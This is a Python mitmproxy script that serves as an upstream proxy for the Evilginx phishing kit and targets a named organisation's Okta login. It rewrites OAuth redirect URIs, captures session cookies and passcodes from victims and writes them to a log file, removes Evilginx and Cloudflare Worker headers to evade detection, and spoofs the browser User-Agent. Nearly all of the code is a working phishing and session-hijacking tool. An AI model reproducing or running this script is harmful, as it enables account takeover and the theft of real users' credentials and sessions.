# use this as the upstream proxy for evilginx
# Use: mitmproxy -s ./mitm.py
# Replace <CLIENT-SUBDOMAIN> with your actual client subdomain

from mitmproxy import http
from datetime import datetime
import json

def request(flow: http.HTTPFlow) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    #first catchall redirect
    if flow.request.method == "POST":
        if flow.request.headers.get("content-type", "") == "application/x-www-form-urlencoded":
            form_data = flow.request.urlencoded_form

            if "redirect_uri" in form_data:
                print(f"Original redirect_uri: {form_data['redirect_uri']}")

                form_data["redirect_uri"] = "https://thrivent.okta.com/enduser/callback"
                print(f"Modified redirect_uri: {form_data['redirect_uri']}")

                flow.request.urlencoded_form = form_data

    # redirect somewhere else v2 :D
    if flow.request.method == "GET":
        if "redirect_uri" in flow.request.query:
            flow.request.query["redirect_uri"] = "https://thrivent.okta.com/enduser/callback"


    #token stealing
    if "oauth2/v1/authorize" in flow.request.path:
        if "idx" in flow.request.cookies:
            print(f'Successfully intercepted cookies from {flow.request.cookies["ln"]}')
            with open("mitmproxy.authlogs.txt", "a") as logFile:
                logFile.write(f'[{timestamp}] [COOKIE] User: {flow.request.cookies["ln"]} Cookies: {flow.request.cookies}\n')

            flow.response = http.Response.make(
                302,
                b"",
                {"Location": "https://cloudflare.com/"} # Change this to your desired redirect URL pls
            )
        else:
            print("No 'idx' cookie found.")

    #capture creds
    if flow.request.method == "POST" and flow.request.headers["Content-Type"] == "application/json":
        try:
            data = json.loads(flow.request.get_text())
        except (json.JSONDecodeError, UnicodeDecodeError):
            return
        if isinstance(data, dict):
            credentials = data.get("credentials")
            if isinstance(credentials, dict) and "passcode" in credentials:
                passcode = credentials["passcode"]
                with open("mitmproxy.authlogs.txt", "a") as logFile:
                    logFile.write(f'[{timestamp}] [CREDENTIALS] {flow.request.cookies["ln"]} : {passcode}\n')

    #sneeky beeky removal
    if "X-Evilginx" in flow.request.headers:
        del flow.request.headers["X-Evilginx"]
    if "CF-Worker" in flow.request.headers:
        del flow.request.headers["CF-Worker"]


    # rip'n'replace useragent
#    if "User-Agent" in flow.request.headers and "X-Test-UA" in flow.request.headers:
#        newUserAgentString = flow.request.headers["X-Test-UA"]
#        flow.request.headers["User-Agent"] = newUserAgentString
#    else:
#        windowsUserAgentString = "Mozilla/5.0 (Window NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
#        flow.request.headers["User-Agent"] = windowsUserAgentString

    if "User-Agent" in flow.request.headers:
        windowsUserAgentString = "Mozilla/5.0 (Window NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
        flow.request.headers["User-Agent"] = windowsUserAgentString
